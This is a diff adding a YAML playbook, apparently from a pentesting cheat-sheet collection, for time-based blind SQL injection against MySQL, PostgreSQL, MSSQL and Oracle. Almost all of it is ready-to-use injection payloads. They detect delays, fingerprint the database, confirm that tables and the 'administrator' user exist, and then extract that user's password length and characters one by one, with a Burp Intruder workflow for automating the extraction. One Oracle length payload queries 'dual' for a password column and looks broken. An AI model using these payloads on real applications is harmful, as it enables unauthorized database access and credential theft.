@@ -1,0 +1,319 @@
+name: Time-Based Blind SQLi
+
+steps:
+
+# =========================================================
+# [1] DETECT TIME DELAYS
+# =========================================================
+- title: Detect Time Delays
+  mode: chain
+  info: |
+    Identify whether injected SQL can trigger measurable delays.
+
+  entries:
+
+    - cmd: "'; SELECT SLEEP(5)--"
+      info: mysql sleep
+
+    - cmd: "'; SELECT pg_sleep(5)--"
+      info: postgres sleep
+
+    - cmd: "'; WAITFOR DELAY '0:0:5'--"
+      info: mssql delay
+
+    - cmd: "'||(SELECT dbms_pipe.receive_message(('a'),5) FROM dual)||'"
+      info: oracle sleep
+
+  look_for:
+    - delayed responses
+    - consistent response timing
+    - timeout behavior
+
+  notes:
+    - baseline response timing first
+    - network jitter may affect results
+    - 5-10 seconds usually reliable
+
+
+# =========================================================
+# [2] CONFIRM SQL INJECTION
+# =========================================================
+- title: Confirm SQL Injection
+  mode: enum
+  info: |
+    Verify that delays are caused by SQL execution.
+
+  entries:
+
+    - cmd: "'; SELECT SLEEP(0)--"
+      info: no delay baseline
+
+    - cmd: "'; SELECT SLEEP(5)--"
+      info: delayed response
+
+    - cmd: "'||(SELECT dbms_pipe.receive_message(('a'),0) FROM dual)||'"
+      info: oracle baseline
+
+    - cmd: "'||(SELECT dbms_pipe.receive_message(('a'),5) FROM dual)||'"
+      info: oracle delayed response
+
+  look_for:
+    - consistent timing differences
+    - fast vs delayed responses
+
+  notes:
+    - compare multiple requests
+    - delays should be repeatable
+
+
+# =========================================================
+# [3] DATABASE FINGERPRINTING
+# =========================================================
+- title: Fingerprint Database
+  mode: enum
+  info: |
+    Identify database type using time-delay syntax.
+
+  entries:
+
+    - cmd: "'; SELECT SLEEP(5)--"
+      info: mysql
+
+    - cmd: "'; SELECT pg_sleep(5)--"
+      info: postgres
+
+    - cmd: "'; WAITFOR DELAY '0:0:5'--"
+      info: mssql
+
+    - cmd: "'||(SELECT dbms_pipe.receive_message(('a'),5) FROM dual)||'"
+      info: oracle
+
+  look_for:
+    - successful delay execution
+    - syntax-specific behavior
+
+  notes:
+    - delay syntax is highly DB-specific
+    - fingerprinting improves payload reliability
+
+
+# =========================================================
+# [4] CONDITIONAL TIME DELAYS
+# =========================================================
+- title: Conditional Delays
+  mode: enum
+  info: |
+    Trigger delays only when conditions evaluate TRUE.
+
+  entries:
+
+    - cmd: "'; SELECT IF(1=1,SLEEP(5),0)--"
+      info: mysql true condition
+
+    - cmd: "'; SELECT IF(1=2,SLEEP(5),0)--"
+      info: mysql false condition
+
+    - cmd: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
+      info: postgres conditional sleep
+
+    - cmd: "'; IF (1=1) WAITFOR DELAY '0:0:5'--"
+      info: mssql conditional delay
+
+    - cmd: "'||(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual)||'"
+      info: oracle conditional delay
+
+  look_for:
+    - delays only on TRUE
+    - immediate responses on FALSE
+
+  notes:
+    - this is the foundation of blind extraction
+    - reliable TRUE/FALSE distinction required
+
+
+# =========================================================
+# [5] TEST TABLE EXISTENCE
+# =========================================================
+- title: Test Table Existence
+  mode: enum
+  info: |
+    Determine whether target tables exist.
+
+  entries:
+
+    - cmd: "'; SELECT IF(EXISTS(SELECT * FROM users),SLEEP(5),0)--"
+      info: mysql table existence
+
+    - cmd: "'; SELECT CASE WHEN EXISTS(SELECT * FROM users) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
+      info: postgres table existence
+
+    - cmd: "'||(SELECT CASE WHEN EXISTS(SELECT * FROM users) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual)||'"
+      info: oracle existence check
+
+  look_for:
+    - delayed responses
+    - successful conditional execution
+
+  notes:
+    - common table names:
+      - users
+      - accounts
+      - admins
+      - credentials
+
+
+# =========================================================
+# [6] TEST USER EXISTENCE
+# =========================================================
+- title: Test User Existence
+  mode: enum
+  info: |
+    Confirm usernames exist using conditional delays.
+
+  entries:
+
+    - cmd: "'; SELECT IF(EXISTS(SELECT * FROM users WHERE username='administrator'),SLEEP(5),0)--"
+      info: mysql username check
+
+    - cmd: "'; SELECT CASE WHEN EXISTS(SELECT * FROM users WHERE username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END--"
+      info: postgres username check
+
+    - cmd: "'||(SELECT CASE WHEN EXISTS(SELECT * FROM users WHERE username='administrator') THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual)||'"
+      info: oracle username check
+
+  look_for:
+    - delayed responses on valid usernames
+
+  notes:
+    - administrator is common target
+    - adapt usernames as needed
+
+
+# =========================================================
+# [7] DETERMINE PASSWORD LENGTH
+# =========================================================
+- title: Determine Password Length
+  mode: chain
+  info: |
+    Infer password length using conditional delays.
+
+  entries:
+
+    - cmd: "'; SELECT IF(LENGTH(password)>5,SLEEP(5),0) FROM users WHERE username='administrator'--"
+      info: mysql length test
+
+    - cmd: "'; SELECT CASE WHEN LENGTH(password)>10 THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
+      info: postgres length test
+
+    - cmd: "'||(SELECT CASE WHEN LENGTH(password)>15 THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual WHERE username='administrator')||'"
+      info: oracle length test
+
+  look_for:
+    - delays disappear at final length
+
+  notes:
+    - binary search can speed extraction
+    - compare timing carefully
+
+
+# =========================================================
+# [8] EXTRACT PASSWORD CHARACTERS
+# =========================================================
+- title: Extract Characters
+  mode: chain
+  info: |
+    Extract password characters one at a time.
+
+  entries:
+
+    - cmd: "'; SELECT IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) FROM users WHERE username='administrator'--"
+      info: mysql first character
+
+    - cmd: "'; SELECT CASE WHEN SUBSTRING(password,2,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
+      info: postgres second character
+
+    - cmd: "'||(SELECT CASE WHEN SUBSTR(password,3,1)='a' THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM users WHERE username='administrator')||'"
+      info: oracle third character
+
+  look_for:
+    - delayed response on correct character
+
+  notes:
+    - iterate:
+      - position
+      - charset
+    - common charset:
+      - a-z
+      - 0-9
+    - Burp Intruder recommended
+
+
+# =========================================================
+# [9] BURP INTRUDER WORKFLOW
+# =========================================================
+- title: Burp Intruder Workflow
+  mode: chain
+  info: |
+    Automate time-based extraction using Intruder.
+
+  entries:
+
+    - cmd: "SUBSTRING(password,1,1)='§a§'"
+      info: mark payload position
+
+    - cmd: "Payloads: a-z0-9"
+      info: brute-force charset
+
+    - cmd: "Observe response times"
+      info: detect TRUE condition
+
+  look_for:
+    - longer response times
+    - timing spikes
+    - delayed requests
+
+  notes:
+    - sniper mode usually sufficient
+    - avoid overwhelming target
+    - timing attacks may be noisy
+
+
+# =========================================================
+# [10] FULL TIME-BASED WORKFLOW
+# =========================================================
+- title: Full Time-Based Workflow
+  mode: chain
+  info: |
+    Example methodology for time-based blind SQL injection.
+
+  entries:
+
+    - cmd: "'; SELECT SLEEP(5)--"
+      info: verify injectable delay
+
+    - cmd: "'; SELECT IF(EXISTS(SELECT * FROM users),SLEEP(5),0)--"
+      info: verify users table
+
+    - cmd: "'; SELECT IF(EXISTS(SELECT * FROM users WHERE username='administrator'),SLEEP(5),0)--"
+      info: verify administrator exists
+
+    - cmd: "'; SELECT IF(LENGTH(password)>10,SLEEP(5),0) FROM users WHERE username='administrator'--"
+      info: determine password length
+
+    - cmd: "'; SELECT IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) FROM users WHERE username='administrator'--"
+      info: extract password characters
+
+  look_for:
+    - delayed responses
+    - TRUE/FALSE timing differences
+
+  notes:
+    - replace:
+      - table names
+      - usernames
+      - columns
+    - adapt syntax for:
+      - mysql
+      - postgres
+      - mssql
+      - oracle
